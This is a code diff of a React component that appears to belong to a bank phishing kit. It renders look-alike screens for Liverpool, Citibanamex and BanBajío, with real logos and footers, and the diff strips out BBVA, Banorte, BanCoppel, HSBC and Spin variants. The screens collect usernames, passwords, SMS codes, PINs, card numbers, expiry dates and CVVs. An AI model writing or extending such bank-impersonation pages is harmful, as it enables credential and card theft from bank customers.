@@ -6,11 +6,6 @@ import { ScreenType } from '@shared/schema';
 import liverpoolLogo from '../../assets/pngwing.com 2.png';
 import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
-import bancoppelLogo from '../../assets/bancoppel.png';
-import banorteLogo from '../../assets/banorte-logo.png';
-import bbvaLogo from '../../assets/bbva_logo.png';
-import hsbcLogo from '../../assets/hsbc_logo.png';
-import spinLogo from '../../assets/spin_logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -46,93 +41,26 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const renderScreen = () => {
     // Función para obtener el contenedor según el banco
     const getBankContainer = (children: React.ReactNode) => {
-      if (banco === 'BBVA') {
+      if (banco === 'BANBAJIO') {
         return (
-          <div className="bbva-container">
-            <div className="bbva-header">
-              {bankLogo()}
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <div className="bajionet text-2xl font-bold mb-3">
+              <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
             </div>
-            <div className="bbva-content">
-              {children}
-            </div>
+            {children}
           </div>
         );
-      } else if (banco === 'BANORTE') {
+      } else if (banco === 'CITIBANAMEX') {
         return (
-          <div className="banorte-container">
-            <div className="banorte-header">
-              <div className="white-logo">
-                {bankLogo()}
-              </div>
-            </div>
-            <div className="banorte-content">
-              {children}
-            </div>
-            <div className="banorte-footer">
-              <div>
-                <a href="#">Aprende más</a> | 
-                <a href="#">Ayuda</a> | 
-                <a href="#">Términos y condiciones</a> | 
-                <a href="#">Seguridad en línea</a>
-              </div>
-              <p>© Banorte México 2025. Todos los Derechos Reservados</p>
-            </div>
-          </div>
-        );
-      } else if (banco === 'BANCOPPEL') {
-        return (
-          <div className="bancoppel-container">
-            <div className="bancoppel-header">
-              {bankLogo()}
-              <strong>7 de abril de 2025</strong>
-            </div>
-            <div className="bancoppel-content">
-              {bankLogo()}
-              {children}
-            </div>
-            <div className="bancoppel-footer-links">
-              Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
-            </div>
-            <div className="bancoppel-footer">
-              Contactanos | Aclaraciones | Promociones | Facebook | Youtube <br />
-              Copyright 2025 Bancoppel S.A Institución de Banca Múltiple - Todos los derechos reservados
-            </div>
-          </div>
-        );
-      } else if (banco === 'SPIN') {
-        return (
-          <div className="spin-container">
-            <div className="spin-header">
-              <h1>spin <small>by oxxo</small></h1>
-            </div>
-            <div className="spin-date">7 de abril de 2025</div>
-            <div className="spin-content">
-              {children}
-            </div>
-            <div className="spin-links">
-              <a href="#">Aprende más</a> |
-              <a href="#">Ayuda</a> |
-              <a href="#">Términos y condiciones</a> |
-              <a href="#">Seguridad en línea</a>
-            </div>
-            <div className="spin-bottom-links">
-              <a href="#">Contáctanos</a> |
-              <a href="#">Aclaraciones</a> |
-              <a href="#">Promociones</a> |
-              <a href="#">Facebook</a> |
-              <a href="#">Youtube</a>
-              <p>Spin by OXXO © 2025. Todos los Derechos Reservados</p>
-            </div>
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {bankLogo()}
+            {children}
           </div>
         );
       } else {
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
-            {banco === 'BANBAJIO' && (
-              <div className="bajionet text-2xl font-bold mb-3">
-                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
-              </div>
-            )}
+            {bankLogo()}
             {children}
           </div>
         );
@@ -152,7 +80,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         <Input 
           type="text" 
           placeholder="Ingrese su número de folio" 
-          className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
+          className="w-full border border-gray-300 rounded p-2 mb-3"
           value={folioInput}
           onChange={(e) => setFolioInput(e.target.value)}
         />
@@ -177,14 +105,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <Input 
               type="text" 
               placeholder="Usuario" 
-              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
+              className="w-full border border-gray-300 rounded p-2 mb-3"
               value={loginInputs.username}
               onChange={(e) => setLoginInputs(prev => ({ ...prev, username: e.target.value }))}
             />
             <Input 
               type="password" 
               placeholder="Contraseña" 
-              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
+              className="w-full border border-gray-300 rounded p-2 mb-3"
               value={loginInputs.password}
               onChange={(e) => setLoginInputs(prev => ({ ...prev, password: e.target.value }))}
             />
@@ -208,7 +136,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <Input 
               type="text" 
               placeholder="Ingrese el SMS recibido" 
-              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
+              className="w-full border border-gray-300 rounded p-2 mb-3"
               value={codigoInput}
               onChange={(e) => setCodigoInput(e.target.value)}
             />
@@ -237,7 +165,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               type="password" 
               placeholder="Ingrese su NIP" 
               maxLength={4}
-              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
+              className="w-full border border-gray-300 rounded p-2 mb-3"
               value={nipInput}
               onChange={(e) => setNipInput(e.target.value)}
             />
@@ -315,7 +243,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <Input 
                 type="text" 
                 placeholder="Número de tarjeta (16 dígitos)" 
-                className={banco === 'BBVA' ? "bbva-input mb-3" : "w-full border border-gray-300 rounded p-2 mb-3"}
+                className="w-full border border-gray-300 rounded p-2 mb-3"
                 value={tarjetaInput}
                 onChange={(e) => setTarjetaInput(e.target.value)}
                 maxLength={16}
@@ -326,7 +254,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <Input 
                     type="text" 
                     placeholder="Fecha de vencimiento (MM/AA)" 
-                    className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2"}
+                    className="w-full border border-gray-300 rounded p-2"
                     value={fechaVencimientoInput}
                     onChange={(e) => setFechaVencimientoInput(e.target.value)}
                     maxLength={5}
@@ -336,7 +264,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <Input 
                     type="text" 
                     placeholder="CVV (código verificador)" 
-                    className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2"}
+                    className="w-full border border-gray-300 rounded p-2"
                     value={cvvInput}
                     onChange={(e) => setCvvInput(e.target.value)}
                     maxLength={3}
@@ -368,8 +296,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </Button>
             
             <div className="mt-4">
-              <a href="#" className={banco === 'BANORTE' ? "text-[#e60012] block mt-2 text-sm" : "text-blue-600 block mt-2 text-sm"}>Nueva aclaración</a>
-              <a href="#" className={banco === 'BANORTE' ? "text-[#e60012] block mt-2 text-sm" : "text-blue-600 block mt-2 text-sm"}>Estatus de mis aclaraciones</a>
+              <a href="#" className="text-blue-600 block mt-2 text-sm">Nueva aclaración</a>
+              <a href="#" className="text-blue-600 block mt-2 text-sm">Estatus de mis aclaraciones</a>
             </div>
           </>
         );
@@ -421,11 +349,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className={`h-full ${
                 banco === 'BANBAJIO' ? 'banbajio-bg' : 
                 banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
-                banco === 'BANCOPPEL' ? 'bancoppel-bg' :
-                banco === 'BANORTE' ? 'banorte-bg' :
-                banco === 'BBVA' ? 'bbva-bg' :
-                banco === 'HSBC' ? 'hsbc-bg' :
-                banco === 'SPIN' ? 'spin-bg' :
                 'bg-[#e10098]'
               } animate-progress-bar`}></div>
             </div>
@@ -452,16 +375,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANBAJIO':
         return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
-      case 'BANCOPPEL':
-        return 'bancoppel-button';
-      case 'BANORTE':
-        return 'banorte-button';
-      case 'BBVA':
-        return 'bbva-button';
-      case 'HSBC':
-        return 'hsbc-button';
-      case 'SPIN':
-        return 'spin-button';
       default:
         return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
     }
@@ -475,16 +388,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
       case 'BANBAJIO':
         return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
-      case 'BANCOPPEL':
-        return <img src={bancoppelLogo} alt="BanCoppel" className="h-16 mx-auto mb-4" />;
-      case 'BANORTE':
-        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
-      case 'BBVA':
-        return <img src={bbvaLogo} alt="BBVA" className="h-16 mx-auto mb-4" />;
-      case 'HSBC':
-        return <img src={hsbcLogo} alt="HSBC" className="h-16 mx-auto mb-4" />;
-      case 'SPIN':
-        return <img src={spinLogo} alt="Spin by OXXO" className="h-16 mx-auto mb-4" />;
       default:
         return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
     }
@@ -494,11 +397,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const getBankHeaderClass = () => {
     switch(banco) {
       case 'BANBAJIO': return 'banbajio-header';
-      case 'BANCOPPEL': return 'bancoppel-header';
-      case 'BANORTE': return 'banorte-header';
-      case 'BBVA': return 'bbva-header';
-      case 'HSBC': return 'hsbc-header';
-      case 'SPIN': return 'spin-header';
+      case 'CITIBANAMEX': return 'citibanamex-header';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
     }
   };
@@ -507,59 +406,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const getBankContainerClass = () => {
     switch(banco) {
       case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
-      case 'BANCOPPEL': return 'bancoppel-container';
-      case 'BANORTE': return 'banorte-container';
-      case 'BBVA': return 'bbva-container';
-      case 'HSBC': return 'hsbc-container';
-      case 'SPIN': return 'spin-container';
+      case 'CITIBANAMEX': return 'citibanamex-container';
       default: return '';
     }
   };
 
-  // Renderizado especial para HSBC que incluye fondo y footer
-  if (banco === 'HSBC') {
-    return (
-      <div className="hsbc-page-background">
-        <div className="hsbc-container">
-          <div className="logo text-center mb-4">
-            {bankLogo()}
-          </div>
-          {renderScreen()}
-        </div>
-        <div className="hsbc-footer">
-          © HSBC México 2023. Todos los Derechos Reservados
-        </div>
-      </div>
-    );
-  }
-  
-  // Renderizado especial para BBVA
-  if (banco === 'BBVA') {
-    return (
-      <div className="bbva-page-background">
-        <header className="bbva-header">
-          <div className="logo p-2">
-            {bankLogo()}
-          </div>
-        </header>
-        <div className="bbva-navbar">
-          <a href="#">PERSONAS</a>
-          <a href="#">EMPRESAS Y GOBIERNO</a>
-        </div>
-        <div className="bbva-main-container">
-          <div className="bbva-container">
-            {renderScreen()}
-          </div>
-        </div>
-        <div className="bbva-footer-links">
-          <p>
-            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea<br/>
-            Contactanos | Aclaraciones | Promociones | Facebook | Youtube<br/>
-            © BBVA México 2024. Todos los Derechos Reservados
-          </p>
-        </div>
-      </div>
-    );
+  // Renderizados especiales según el banco
+  if (banco === 'CITIBANAMEX') {
+    // Podríamos agregar un renderizado especial para CitiBanamex si se necesita en el futuro
   }
 
   // Renderizado normal para otros bancos
